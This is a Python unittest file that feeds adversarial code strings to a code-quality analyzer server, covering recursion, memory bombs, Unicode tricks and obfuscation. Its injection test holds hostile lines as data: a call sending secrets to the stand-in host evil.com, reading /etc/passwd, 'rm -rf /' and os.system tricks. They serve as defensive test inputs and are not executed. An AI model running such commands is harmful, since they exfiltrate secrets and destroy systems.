#!/usr/bin/env python3
"""
Adversarial Test Cases for Python Code Quality MCP Server
Kiểm tra server với các trường hợp đối nghịch và edge cases extreme
"""

import unittest
import os
import tempfile
import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'src'))

from server import CodeMemoryManager, EnhancedCodeAnalyzer


class TestAdversarialInputs(unittest.TestCase):
    """Test với các inputs đối nghịch được thiết kế để phá server"""
    
    def setUp(self):
        self.test_db = tempfile.mktemp(suffix=".db")
        
    def tearDown(self):
        if os.path.exists(self.test_db):
            os.remove(self.test_db)
    
    def test_infinite_recursion_code(self):
        """Test: Code có thể gây infinite recursion"""
        infinite_code = """
def infinite_recursion():
    return infinite_recursion()

def mutual_recursion_a():
    return mutual_recursion_b()

def mutual_recursion_b():
    return mutual_recursion_a()

# Deeply nested calls
def deep_recursion(n=1000000):
    if n > 0:
        return deep_recursion(n-1)
    return n
"""
        
        memory_manager = CodeMemoryManager(self.test_db)
        analyzer = EnhancedCodeAnalyzer(memory_manager)
        
        try:
            analysis = analyzer.analyze_with_context(infinite_code)
            
            # Server should complete analysis without hanging
            self.assertIsInstance(analysis, dict)
            self.assertIn("quality_score", analysis)
            
            print(f"Infinite recursion code quality: {analysis['quality_score']}")
            
        except Exception as e:
            self.fail(f"Server crashed on infinite recursion code: {e}")
    
    def test_memory_bomb_code(self):
        """Test: Code được thiết kế để làm tràn memory"""
        memory_bomb = """
# Memory bomb patterns
huge_list = [0] * (10**8)  # 100M elements
nested_lists = [[i] * 1000 for i in range(100000)]
string_bomb = 'x' * (10**7)  # 10MB string

def memory_explosion():
    data = []
    for i in range(1000000):
        data.append([j for j in range(1000)])
    return data

def exponential_growth(n=20):
    if n <= 0:
        return [[]]
    smaller = exponential_growth(n-1)
    return smaller + [x + [i] for x in smaller for i in range(2)]
"""
        
        memory_manager = CodeMemoryManager(self.test_db)
        analyzer = EnhancedCodeAnalyzer(memory_manager)
        
        try:
            analysis = analyzer.analyze_with_context(memory_bomb)
            
            # Server should handle without crashing
            self.assertIsInstance(analysis, dict)
            print(f"Memory bomb code quality: {analysis['quality_score']}")
            
        except MemoryError:
            self.fail("Server should handle memory bomb gracefully")
        except Exception as e:
            print(f"Expected exception for memory bomb: {e}")
    
    def test_unicode_and_encoding_attacks(self):
        """Test: Unicode và encoding edge cases"""
        unicode_code = """
# Unicode variable names (legal in Python 3)
变量 = "Chinese variable"
مرحبا = "Arabic variable"  
🚀 = "Emoji variable"

def функция():  # Cyrillic function name
    return "Привет мир"

# Zero-width characters (invisible)
invisible_char = "​"  # Zero-width space
def test​function():  # Function with invisible char
    pass

# Unicode normalization issues
café1 = "café"  # é as single character
café2 = "cafe\u0301"  # é as e + combining accent

# Bidirectional text (can cause display issues)
rtl_text = "Hello ‮world‬ normal"
"""
        
        memory_manager = CodeMemoryManager(self.test_db)
        analyzer = EnhancedCodeAnalyzer(memory_manager)
        
        try:
            analysis = analyzer.analyze_with_context(unicode_code)
            
            self.assertIsInstance(analysis, dict)
            print(f"Unicode code quality: {analysis['quality_score']}")
            
            # Should handle Unicode gracefully
            self.assertGreater(analysis['quality_score'], 0)
            
        except UnicodeError:
            self.fail("Server should handle Unicode gracefully")
    
    def test_syntactically_correct_but_semantic_nonsense(self):
        """Test: Code syntactically đúng nhưng semantically vô nghĩa"""
        nonsense_code = """
# Syntactically valid but semantically nonsense
def quantum_entangle(cat, box):
    schrödinger = cat * box
    if schrödinger == True:
        return False
    else:
        return None + "string"

# Type confusion
def type_chaos():
    x = "5"
    y = 5
    z = [5]
    return x + y + z  # Type error waiting to happen

# Logic that makes no sense
def mathematical_impossibility():
    infinity = float('inf')
    result = infinity - infinity  # NaN
    if result == result:  # NaN != NaN
        return "impossible"
    else:
        return "expected"

# Function that does opposite of its name
def sort_list(items):
    import random
    random.shuffle(items)
    return items
"""
        
        memory_manager = CodeMemoryManager(self.test_db)
        analyzer = EnhancedCodeAnalyzer(memory_manager)
        
        analysis = analyzer.analyze_with_context(nonsense_code)
        
        print(f"Semantic nonsense code quality: {analysis['quality_score']}")
        print(f"Detected issues: {len(analysis['errors'])}")
        
        # Should detect some issues but might miss semantic problems
        self.assertIsInstance(analysis, dict)
    
    def test_code_injection_attempts(self):
        """Test: Attempts to inject malicious code through analysis"""
        injection_code = """
# Code that tries to break out of analysis
import os
os.system("echo 'pwned'")

# Exec attempts
exec("print('injected code')")

# File system access
with open('/etc/passwd', 'r') as f:
    secrets = f.read()

# Network attempts
import urllib.request
urllib.request.urlopen('http://evil.com/steal?data=secrets')

# Process manipulation
import subprocess
subprocess.call(['rm', '-rf', '/'])

# Module importation tricks
__import__('os').system('whoami')
getattr(__import__('os'), 'system')('id')
"""
        
        memory_manager = CodeMemoryManager(self.test_db)
        analyzer = EnhancedCodeAnalyzer(memory_manager)
        
        # This should NOT execute the malicious code, only analyze it
        try:
            analysis = analyzer.analyze_with_context(injection_code)
            
            # Should detect security issues
            security_errors = [e for e in analysis['errors'] 
                             if any(keyword in e.get('message', '').lower() 
                                   for keyword in ['system', 'exec', 'security'])]
            
            print(f"Security errors detected: {len(security_errors)}")
            print(f"Injection code quality: {analysis['quality_score']}")
            
            # Should heavily penalize malicious code
            self.assertLess(analysis['quality_score'], 50.0, "Malicious code should get low score")
            
        except Exception as e:
            print(f"Analysis failed on injection code: {e}")


class TestExtremeCodePatterns(unittest.TestCase):
    """Test với các patterns code extreme"""
    
    def setUp(self):
        self.test_db = tempfile.mktemp(suffix=".db")
        
    def tearDown(self):
        if os.path.exists(self.test_db):
            os.remove(self.test_db)
    
    def test_deeply_nested_structures(self):
        """Test: Code với nested structures cực sâu"""
        deep_nested = """
def level_1():
    def level_2():
        def level_3():
            def level_4():
                def level_5():
                    def level_6():
                        def level_7():
                            def level_8():
                                def level_9():
                                    def level_10():
                                        return "too deep"
                                    return level_10()
                                return level_9()
                            return level_8()
                        return level_7()
                    return level_6()
                return level_5()
            return level_4()
        return level_3()
    return level_2()

# Deeply nested conditionals
def nested_conditions(x):
    if x > 10:
        if x > 20:
            if x > 30:
                if x > 40:
                    if x > 50:
                        if x > 60:
                            if x > 70:
                                if x > 80:
                                    if x > 90:
                                        return "very high"
                                    return "high"
                                return "medium-high"
                            return "medium"
                        return "medium-low"
                    return "low-medium"
                return "low"
            return "very low"
        return "minimal"
    return "zero"
"""
        
        memory_manager = CodeMemoryManager(self.test_db)
        analyzer = EnhancedCodeAnalyzer(memory_manager)
        
        analysis = analyzer.analyze_with_context(deep_nested)
        
        print(f"Deep nested code quality: {analysis['quality_score']}")
        
        # Should detect complexity issues
        complexity_errors = [e for e in analysis['errors'] 
                           if 'complex' in e.get('message', '').lower()]
        
        print(f"Complexity issues detected: {len(complexity_errors)}")
    
    def test_obfuscated_code(self):
        """Test: Code bị obfuscated"""
        obfuscated = """
# Obfuscated variable names
_ = lambda __: _.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit()
__ = (lambda _: _())(lambda: (lambda _: _(_, _))(lambda _, __: _))
___ = lambda __,_: __(__(_, _))

# Single letter variables everywhere
def f(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z):
    return a+b-c*d/e%f**g//h&i|j^k<<l>>m and n or o if p else q

# Meaningless intermediate variables
def process(data):
    a = data
    b = a
    c = b
    d = c
    e = d
    f = e
    g = f
    h = g
    i = h
    j = i
    return j

# Cryptic one-liners
result = [[[x for x in range(y)] for y in range(z)] for z in range(5)]
compressed = ''.join(chr(ord(c) ^ 42) for c in "secret")
"""
        
        memory_manager = CodeMemoryManager(self.test_db)
        analyzer = EnhancedCodeAnalyzer(memory_manager)
        
        analysis = analyzer.analyze_with_context(obfuscated)
        
        print(f"Obfuscated code quality: {analysis['quality_score']}")
        
        # Should heavily penalize unreadable code
        self.assertLess(analysis['quality_score'], 40.0, "Obfuscated code should get very low score")


if __name__ == "__main__":
    # Run specific test groups
    loader = unittest.TestLoader()
    
    print("=" * 60)
    print("ADVERSARIAL INPUTS TESTS")
    print("=" * 60)
    suite1 = loader.loadTestsFromTestCase(TestAdversarialInputs)
    unittest.TextTestRunner(verbosity=2).run(suite1)
    
    print("\n" + "=" * 60)
    print("EXTREME CODE PATTERNS TESTS")
    print("=" * 60)
    suite2 = loader.loadTestsFromTestCase(TestExtremeCodePatterns)
    unittest.TextTestRunner(verbosity=2).run(suite2)
